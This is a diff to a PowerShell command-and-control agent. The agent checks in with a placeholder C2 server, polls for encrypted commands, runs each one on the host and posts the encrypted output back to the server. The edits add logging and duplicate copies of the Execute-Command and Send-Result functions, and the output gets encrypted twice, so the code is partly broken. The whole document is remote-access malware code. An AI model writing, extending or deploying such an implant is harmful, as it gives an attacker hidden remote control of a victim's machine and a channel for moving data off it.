@@ -9,7 +9,7 @@
 #########################################################################################################################################################################################################################
 
 # Configuration
-$server_url = "http://10.0.2.4:8080"
+$server_url = "http://C2_Server_IP_or_URL:8080"
 $results_url = "$server_url/result"
 Write-Host "Results URL: $results_url"
 $sovereign_folder = "C:\sovereign"
@@ -63,7 +63,7 @@ function Get-PublicKey {
 function Checkin {
     try {
         $response = Invoke-RestMethod -Uri $checkin_url -Method Post -Body (@{AgentID = $agent_id} | ConvertTo-Json) -ContentType "application/json"
-        Log-Message "Checkin Response: $($response.Status)"
+        Log-Message "Checkin Response: $($response | ConvertTo-Json -Depth 3)"
     } catch {
         Log-Message "Error during check-in: $_"
     }
@@ -159,13 +159,13 @@ function Decrypt-Data {
     return $decrypted_data
 }
 
-# Execute command received from the server
 function Execute-Command {
     param (
         [string]$command
     )
     try {
         $output = & $command 2>&1
+        Log-Message "Command Output: $output"
     } catch {
         Log-Message "Command execution error: $_"
         return
@@ -176,6 +176,35 @@ function Execute-Command {
 
     # Send the result
     Send-Result -AgentID $agent_id -Command $command -Output $encrypted_result
+}
+
+function Send-Result {
+    param (
+        [string]$AgentID,
+        [string]$Command,
+        [string]$Output
+    )
+
+    # Encrypt the result before sending
+    $EncryptedResult = Encrypt-Data -data $Output
+
+    # Define the results URL (keeping `/result` as per your agent config)
+    $ResultsURL = "$server_url/result"
+
+    # Prepare the payload
+    $Payload = @{
+        AgentID = $AgentID
+        Command = $Command
+        Result  = $EncryptedResult
+    } | ConvertTo-Json -Depth 2
+
+    try {
+        # Send the encrypted result to the server
+        $ResultResponse = Invoke-RestMethod -Uri $ResultsURL -Method Post -Body $Payload -ContentType "application/json"
+        Log-Message "Result Sent: $($ResultResponse.Status)"
+    } catch {
+        Log-Message "Error sending result: $_"
+    }
 }
 
 function Send-Result {
@@ -230,9 +259,14 @@ function MainLoop {
 
             # Poll for commands from the server
             $command_response = Invoke-RestMethod -Uri $send_command_url -Method Post -Body (@{AgentID = $agent_id} | ConvertTo-Json) -ContentType "application/json"
+            Log-Message "Command Response: $($command_response | ConvertTo-Json -Depth 3)"
+            
             if ($command_response.data) {
+                # Decrypt the received command
                 $decrypted_command = Decrypt-Data -encrypted_data_base64 $command_response.data
-                Log-Message "Executing command: $decrypted_command"
+                Log-Message "Decrypted Command: $decrypted_command"
+                
+                # Execute the command and capture the output
                 Execute-Command -command $decrypted_command
             }
         } catch {
@@ -241,7 +275,58 @@ function MainLoop {
     }
 }
 
+# Execute command received from the server
+function Execute-Command {
+    param (
+        [string]$command
+    )
+    try {
+        $output = & $command 2>&1
+        Log-Message "Command Output: $output"
+    } catch {
+        Log-Message "Command execution error: $_"
+        return
+    }
+
+    # Encrypt the result
+    $encrypted_result = Encrypt-Data -data $output
+
+    # Send the result
+    Send-Result -AgentID $agent_id -Command $command -Output $encrypted_result
+}
+
+# Send the result to the server
+function Send-Result {
+    param (
+        [string]$AgentID,
+        [string]$Command,
+        [string]$Output
+    )
+
+    # Encrypt the result before sending
+    $EncryptedResult = Encrypt-Data -data $Output
+
+    # Define the results URL (keeping `/result` as per your agent config)
+    $ResultsURL = "$server_url/result"
+
+    # Prepare the payload
+    $Payload = @{
+        AgentID = $AgentID
+        Command = $Command
+        Result  = $EncryptedResult
+    } | ConvertTo-Json -Depth 2
+
+    try {
+        # Send the encrypted result to the server
+        $ResultResponse = Invoke-RestMethod -Uri $ResultsURL -Method Post -Body $Payload -ContentType "application/json"
+        Log-Message "Result Sent: $($ResultResponse.Status)"
+    } catch {
+        Log-Message "Error sending result: $_"
+    }
+}
+
 # Main script execution
 Checkin
 ExchangeKey
 MainLoop
+
